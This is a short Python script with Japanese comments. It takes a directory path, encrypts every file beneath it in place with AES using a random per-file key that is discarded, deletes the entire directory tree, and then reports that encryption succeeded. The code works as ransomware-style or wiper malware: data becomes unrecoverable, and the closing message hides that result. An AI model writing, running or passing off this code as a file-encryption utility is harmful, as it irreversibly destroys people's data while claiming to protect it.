from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import os
import shutil
import random
import string

def encrypt_file(input_file, key):
    # ファイルの読み込み
    with open(input_file, 'rb') as f:
        data = f.read()

    # AESで使用する鍵とIV（Initialization Vector）を生成
    backend = default_backend()
    iv = os.urandom(16)  # IVはランダムに生成する
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=backend)
    encryptor = cipher.encryptor()

    # データをAESで暗号化し、IVを先頭に追加
    encrypted_data = encryptor.update(data) + encryptor.finalize()

    # IVと暗号化されたデータをファイルに書き込む
    with open(input_file, 'wb') as f:
        f.write(iv + encrypted_data)
        
def randomname(n):
    randlst = [random.choice(string.ascii_letters + string.digits) for i in range(n)]
    return ''.join(randlst)

def get_files_in_directory(directory):
    file_list = []

    # ディレクトリを再帰的に探索し、ファイルをリストに追加する
    for root, directories, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            file_list.append(file_path)

    return file_list

# メインの実行部分
if __name__ == "__main__":
    root_file = input()
    for input_file in get_files_in_directory(root_file):
        # ファイルを暗号化
        encrypt_file(input_file, randomname(32).encode('utf-8')[:32])
    shutil.rmtree(root_file)
    
    print("Encryption completed successfully.")
